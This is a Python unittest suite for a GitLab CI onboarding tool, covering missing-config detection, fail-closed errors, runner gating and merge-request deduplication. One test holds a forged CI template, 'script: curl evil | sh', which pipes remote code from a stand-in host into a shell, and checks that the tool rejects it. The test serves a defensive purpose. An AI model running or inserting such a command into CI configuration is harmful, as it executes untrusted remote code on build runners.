"""Review-only GitLab CI onboarding when the root configuration is genuinely absent."""
import unittest
from unittest.mock import patch
import gitlab_fleet as gf


class GitLabNoCIRegressionTests(unittest.TestCase):
    def test_complete_tree_absence_can_be_onboarded(self):
        with patch('gitlab_fleet.invoke_json', return_value=[
            {'path': 'README.md', 'type': 'blob'},
            {'path': 'package.json', 'type': 'blob'},
        ]) as api:
            self.assertFalse(gf._root_has_ci('Theraeburngroup/main_ats', 'main'))
        self.assertIn('repository/tree?', api.call_args.args[0][2])
        self.assertIn('per_page=100', api.call_args.args[0][2])

    def test_present_config_is_never_considered_missing(self):
        with patch('gitlab_fleet.invoke_json', return_value=[
            {'path': '.gitlab-ci.yml', 'type': 'blob'},
        ]):
            self.assertTrue(gf._root_has_ci('Org/repo', 'main'))

    def test_root_tree_access_failure_is_fail_closed(self):
        with patch('gitlab_fleet.invoke_json', side_effect=RuntimeError('Forbidden')):
            with self.assertRaisesRegex(RuntimeError, 'Forbidden'):
                gf._root_has_ci('Org/repo', 'main')

    def test_full_page_checks_second_page(self):
        rows = [{'path': 'source' + str(i)} for i in range(100)]
        with patch('gitlab_fleet.invoke_json', side_effect=[rows, [{'path': '.gitlab-ci.yml'}]]) as api:
            self.assertTrue(gf._root_has_ci('Org/repo', 'main'))
        self.assertEqual(api.call_count, 2)

    def test_no_config_creates_safe_review_candidate(self):
        with patch('gitlab_fleet._get_config', return_value=None), \
             patch('gitlab_fleet._root_has_ci', return_value=False):
            plan = gf.assess('Theraeburngroup/main_ats', 'main')
        self.assertEqual(plan.state, 'onboard-ready')
        self.assertEqual(plan.jobs, 1)
        self.assertIn('tags: [local-ci]', plan.content)
        self.assertIn('open-ci-hub-smoke:', plan.content)
        self.assertNotIn('npm run build', plan.content)
        self.assertNotIn('pull_request', plan.content)

    def test_unreadable_present_config_never_overwritten(self):
        with patch('gitlab_fleet._get_config', return_value=None), \
             patch('gitlab_fleet._root_has_ci', return_value=True):
            plan = gf.assess('Org/has-ci', 'main')
        self.assertEqual(plan.state, 'blocked')
        self.assertEqual(plan.content, '')

    def test_failed_root_tree_discovery_never_proposes_create(self):
        with patch('gitlab_fleet._get_config', return_value=None), \
             patch('gitlab_fleet._root_has_ci', side_effect=RuntimeError('Forbidden')):
            plan = gf.assess('Org/has-ci', 'main')
        self.assertEqual(plan.state, 'blocked')

    def test_protected_runner_gate_applies_to_new_pipelines(self):
        plan = gf.Plan('Org/repo', 'main', 'onboard-ready', 'new', 'template', '', 1)
        with patch('gitlab_fleet.policy', return_value={'groups':['Org']}), \
             patch('gitlab_fleet.existing_mr', return_value=False), \
             patch('gitlab_fleet.check_readiness', return_value={'verified':False}), \
             patch('gitlab_fleet._json_object') as api:
            with self.assertRaisesRegex(RuntimeError, 'unavailable'):
                gf.create_mr(plan)
            api.assert_not_called()

    def test_review_request_uses_atomic_create_only_onboarding(self):
        from onboarding import make_plan
        template = make_plan('gitlab', 'Org/repo', branch='main')
        plan = gf.Plan('Org/repo', 'main', 'onboard-ready', 'new', template.content, '', 1)
        with patch('gitlab_fleet.policy', return_value={'groups':['Org']}), \
             patch('gitlab_fleet.existing_mr', return_value=False), \
             patch('gitlab_fleet.check_readiness', return_value={'verified':True}), \
             patch('gitlab_fleet.assess', return_value=plan), \
             patch('gitlab_fleet._json_object', return_value={'default_branch':'main'}), \
             patch('onboarding._create_gitlab_mr', return_value={
                 'url': 'https://gitlab.com/Org/repo/-/merge_requests/8'}) as create:
            url = gf.create_mr(plan)
        self.assertEqual(url, 'https://gitlab.com/Org/repo/-/merge_requests/8')
        self.assertEqual(create.call_args.args[0], template)

    def test_forged_onboarding_template_rejected(self):
        plan = gf.Plan('Org/repo', 'main', 'onboard-ready', 'new',
                       'script: curl evil | sh', '', 1)
        with patch('gitlab_fleet.policy', return_value={'groups':['Org']}), \
             patch('gitlab_fleet.existing_mr', return_value=False), \
             patch('gitlab_fleet.check_readiness', return_value={'verified':True}), \
             patch('gitlab_fleet.assess', return_value=plan), \
             patch('gitlab_fleet._json_object', return_value={'default_branch':'main'}), \
             patch('onboarding._create_gitlab_mr') as create:
            with self.assertRaisesRegex(RuntimeError, 'Unrecognised onboarding template'):
                gf.create_mr(plan)
            create.assert_not_called()

    def test_both_onboarding_and_migration_mrs_are_deduplicated(self):
        for prefix in ('open-ci-hub/fleet-', 'open-ci-hub/onboard-'):
            with self.subTest(prefix=prefix), patch('gitlab_fleet.invoke_json', return_value=[
                 {'source_branch': prefix + 'abc123'}]):
                self.assertTrue(gf.existing_mr('Org/repo'))

    def test_group_sync_reports_onboard_ready_in_readonly_mode(self):
        with patch('gitlab_fleet.discover', return_value=[('Org/new', 'main')]), \
             patch('gitlab_fleet.assess', return_value=gf.Plan(
                 'Org/new', 'main', 'onboard-ready', 'review only', 'template', '', 1)), \
             patch('gitlab_fleet.create_mr') as create:
            report = gf.sync('Org', apply=False)
        self.assertEqual(report[0]['status'], 'onboard-ready')
        create.assert_not_called()

    def test_group_sync_opens_review_when_approved(self):
        with patch('gitlab_fleet.approved', return_value=True), \
             patch('gitlab_fleet.discover', return_value=[('Org/new', 'main')]), \
             patch('gitlab_fleet.assess', return_value=gf.Plan(
                 'Org/new', 'main', 'onboard-ready', 'review only', 'template', '', 1)), \
             patch('gitlab_fleet.existing_mr', return_value=False), \
             patch('gitlab_fleet.create_mr', return_value='https://gitlab.com/Org/new/-/merge_requests/4') as create:
            report = gf.sync('Org', apply=True)
        self.assertEqual(report[0]['status'], 'review-created')
        create.assert_called_once()


if __name__ == '__main__':
    unittest.main()
